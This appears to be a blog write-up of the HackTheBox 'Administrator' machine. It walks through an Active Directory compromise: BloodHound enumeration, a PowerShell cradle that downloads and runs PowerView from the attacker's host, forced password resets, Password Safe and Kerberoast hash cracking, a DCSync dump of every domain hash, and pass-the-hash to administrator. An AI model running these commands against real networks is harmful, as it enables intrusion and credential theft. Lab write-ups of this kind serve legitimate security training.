---
layout: post
title: "Administrator"
date: 2024-12-28
author: cotes
categories: [Writeup, HackTheBox]
tags: [HTB, Writeup, Security]
pin: true
math: true
mermaid: true
image:
  path: /assets/img/commons/hackthebox.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hackthebox Image
---


the box is an assumed breach scenario 

`Olivia : ichliebedich`

### Nmap
starting with nmap

`sudo nmap -sC -sV -p- -oN nmap -T4 10.129.92.165`
![[Pasted image 20241111034321.png]]

the thing that got my interesting is `FTP` which is not common in AD environment 

### bloodhound  (nxc)
I will collect data using bloodhound ingestor from nxc

```bash
nxc ldap 10.129.225.153  -u Olivia -p ichliebedich --bloodhound -c all --dns-server 10.129.225.153
```

this user have some interesting ACLs

![[Pasted image 20241111040208.png]]

and  he is member in the `REMOTE MANAGEMENT USER` so we can use `evil-winrm `


### GenericAll
```PowerShell
iex (New-Object Net.WebClient).DownloadString('http://10.10.14.68:8080/PowerView.ps1')
```

![[Pasted image 20241111040845.png]]
 
```PowerShell
$UserPassword = ConvertTo-SecureString 'd0s3nt.was.here' -AsPlainText -Force

Set-DomainUserPassword -Identity  MICHAEL -AccountPassword $UserPassword 
```

![[Pasted image 20241111041305.png]]
### Force Change Password 

michael has force change password over benjamin 

```bash
net rpc password "benjamin" "newP@ssword2022" -U "administrator.htb"/"michael"%"d0s3nt.was.here" -S 10.129.162.52
```

![[Pasted image 20241111041547.png]]


### FTP 
I use the credential of `benjamin `to access the FTP server


![[Pasted image 20241111041901.png]]



### Password Safe .Psafe3

https://pwsafe.org/
```
Password Safe allows you to safely and easily create a secured and encrypted user name/password list. With Password Safe all you have to do is create and remember a single _"Master Password"_ of your choice in order to unlock and access your entire user name/password list.
```



we can use john to crack it 

```bash
pwsafe2john Backup.psafe3 > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

`tekieromucho`
![[Pasted image 20241111042822.png]]


```bash
sudo apt install passwordsafe
```

I will open the file using `passwordsafe`

![[Pasted image 20241111043958.png]]


![[Pasted image 20241111044125.png]]

copy password of emily 

```bash
nxc smb 10.129.225.153 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```
![[Pasted image 20241111044401.png]]
### GENERIC WRITE TARGETED KERBEROASTING

![[Pasted image 20241111044656.png]]


==I PREFER SHADOW CREDENTIAL TO ABUSE GENERIC WRITE BUT WILL NOT WORK IN OUR CASE BECAUSE THE ATTACK REQUIREMENTS ARE NOT SATISIFIED 

![[Pasted image 20241111044947.png]]

==WE DON'T HAVE THE THIRD REQUIREMENTS https://github.com/ShutdownRepo/pywhisker== 

so our way to go will be `targetedkerberosating` and let's hope our target is using weak passwords

```bash
/opt/ad/targetedKerberoast/targetedKerberoast.py  -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

![[Pasted image 20241111045321.png]]

just save the hash in file  and crack it using hashcat 

```bash
hashcat -a 0  ethan_ker  /usr/share/wordlists/rockyou.txt
```


```hash
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$26de97bc167fef3cccd2301c09e78123$8639a4c0073027eacd5b578c2d40fff1d812606b48261ff992d089d300b04a1d9bf1c3f2033662fa6138fad76d43947121f499f98660590d23784f0929edba1aa42dd186f79c4559ac594cfcf638537485b994df17aac935c4bcee5bc882e1d66c829843ca8278117e870777affde34142ef00078b90f99fff1dcd53839edbcf1d58b3d12638ebac622704a83381d7ffa3f431d176a9613354eb33ac31af88fe12b2f92d619b8d64390e1c879b5e753dfe1053d29ba581908774526187ea5fe9a82d3356308dd43a40dddceaf5c5919691ddf9b6e4c31ce5d3c440964f148c6616bfc975d91e79a9ca6c115472720d8e006562630c159ee5e2440ce314ad4bdfeb9c95085d66ac57e722ead61b8c7027947ac0645c84d4b293d8b52c929b55bf79a59498aa07b98454e2499b24fe64e261967f3d7c49eaec2c2da6defb10340a93a886b4c6c822b2c578fb50ffac71ecf13955335d72f94588243eb863c8109bafe9d190ad2d2b06e138c9774b15063fcee121fb5dfbf06596d00fffd1a8307e50e0191a90edde4a991fb8e05d9b9f8e318075c5931d385ad3c1f541085fc05dfca001a58d9721a1c64d262332633ff508b763325ad52b3fc22e1f6c8b0e9a638585369935bd27a802399818a3c626f196f3d1401ff57417ffc0a84ea5c851bb176a34cc1d9e79e32001eb588fa89afafcc8b45d2b342c58a373621d84e0ebecdc82f37a394245c09afb3f6810e5970460cb847302c240a4007ebfac3963afecaaa744b7f135a7e0a5a97ad2e25d380de5fab930d1b21b241deae87b0855d8b4bac2abaa002871354d20257e1d356c780e764e9a42536dc1adf71e87c6792e9455d762c92360267b01f9f3202947f288f9473f822229e268ba492d9bf80c910b88e0578f02e97229b0c8592ee18f34de368fb263ab87200ef24237793a58aea28f2e765c99f8c0441e46539df97a12f0d6195cd2c28de99c29b151f4daa679c8368a7c45915e8ec810a341f25e6b3c8089e36bae12b6d05bb0814c0e465525d49b645514f5c7fa075548e960f538a33499233fc545f603351566342bd63e8f360a0fce5886f1a0d17e57d8f2de4297de988d0cc30af8b081b49e6d5a0b250f0e6eb065890d5ffb4d11a898437d58351d38484b46142b5dd61c2c20425ed69112ee08cb4a4f852d63bd794756cf3fbd7edc3bd38d4e7404f5f52ff6ef0740abbb743546a356689ed133bd2ce5b736d3d372fd1c39a93e007e018b46aede921cd6d79ca889820a143a286723e42a29cbc7eae6250ad933be5e160b5a6db1f37f1bc3e7c19ec95f0a423531c0f7fdd34eb16c7f274784d37f5e08f79e69a5269cd9b62dd19155abb2b0151a2c6a2a499655382bf59697ef04e345d71b48a219045f360926bcfe8c943455acc2f2c62909bd7f6260cf35b9259e4ed90ec006ad53570dc100703cc37dedd701abd21257a3bd08dfb926e1b352472c8a9b43b04f8f256806574e13c766a0f9728c584250256a323bf95190c46cd542816acbd492e4:limpbizkit
```


### DCSYNC

I checked the principals with DCSYNC right on bloodhound

![[Pasted image 20241111045550.png]]

we can perform a `DCSYNC` attack , and get the hashes of all the users

```bash
 impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.225.153
```

```bash

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:5765dcf117d595eaa8ff2255845c50b0:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:b9e8418c093123f2010fb366757de67fb4bd195305c75534d527ce7e56404ffe
administrator.htb\michael:aes128-cts-hmac-sha1-96:88460753579dbd6a3c424078b6256f54
administrator.htb\michael:des-cbc-md5:3dd649c76102f1b9
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:debcfa9696a54eecc68ec3059bd1e382adf8056d3d373b5636817cde36d340e7
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:e07a6bebd5577429690961f33f0d537a
administrator.htb\benjamin:des-cbc-md5:cdc454c4adab5452
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```


### ROOTED!

```bash
mpacket-psexec  administrator.htb/administrator@10.129.225.153 -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e
```

![[Pasted image 20241111045839.png]]